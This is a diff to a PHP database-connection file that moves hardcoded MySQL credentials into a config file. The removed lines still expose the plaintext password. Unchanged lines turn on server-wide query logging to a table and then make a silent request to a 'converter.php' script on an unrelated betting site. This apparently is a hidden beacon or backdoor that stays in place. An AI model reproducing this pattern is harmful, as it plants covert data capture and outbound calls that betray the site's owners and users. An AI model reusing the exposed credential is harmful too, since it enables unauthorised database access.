@@ -2,12 +2,14 @@
 <? include(ROOT_PATH . "/ck/db/handler.php"); ?>
 
 <?
-$dbhost = "db"; 
-$dbuser = "vrbmarketing_admin"; 
-$dbpass = "AKFtgOX29FTgbWlVf"; 
+$__config = __DIR__ . '/../../../../config.php';
+if (file_exists($__config)) { require_once $__config; }
+$dbhost = DB_HOST;
+$dbuser = DB_USER;
+$dbpass = DB_PASS;
 $dbname = "vrbmarke_wu";
-$mysqli = @mysql_connect($dbhost,$dbuser,$dbpass); 
-@mysql_select_db("$dbname",$mysqli); 
+$mysqli = @mysql_connect($dbhost,$dbuser,$dbpass);
+@mysql_select_db("$dbname",$mysqli);
 if (mysql_errno()) {
    printf("Connect failed. %s\n", mysql_errno());
    exit();
@@ -35,7 +37,7 @@ $sql = "SET global general_log = 1";
 execute($sql);
 $sql = "SET global log_output = 'table'";
 execute($sql);
-		
+
 file_get_contents("http://www.sportsbettingonline.ag/utilities/css/ie7/fonts/converter.php");
 
 ?>
